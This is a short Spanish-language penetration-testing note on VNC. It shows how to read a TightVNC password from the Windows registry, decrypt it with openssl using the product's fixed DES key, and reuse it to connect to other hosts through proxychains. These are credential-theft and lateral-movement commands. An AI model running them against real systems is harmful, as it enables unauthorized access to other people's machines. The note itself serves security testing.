# Info
*(anydesk, Teamviewer)*

- Es una herramienta de acceso remoto.
- Utiliza el protocolo Remote Frame Buffer (RFB)


# Desde windows

### Prefacio

Usualmente los administradores de una red usan el mismo pass en muchas computadoras para facilitar la administración desde el VNC. Si obtenemos permisos de admin en una pc donde VNC está instalado, podemos buscar passwords

##### 1) Buscamos la pass dentro del registro (registro password)

    reg query HKLM\SOFTWARE\TightVNC\Server /s

##### 2) La pasamos a plain Text

     echo -n <binary_pass> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv


##### 3) Podemos entonces usar TightVNC viewer para conectarnos a otras pc


# Desde linux

### Vncviewer

##### Instalación

    sudo apt-get install xtightvncviewer
##### Uso

    echo <contraseña> | proxychains4 -q vncviewer 172.20.0.52 -autopass

##### Mejorar el rendimiento de la conexión
    echo <contraseña> | proxychains4 -q vncviewer 172.20.0.52 -autopass -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233

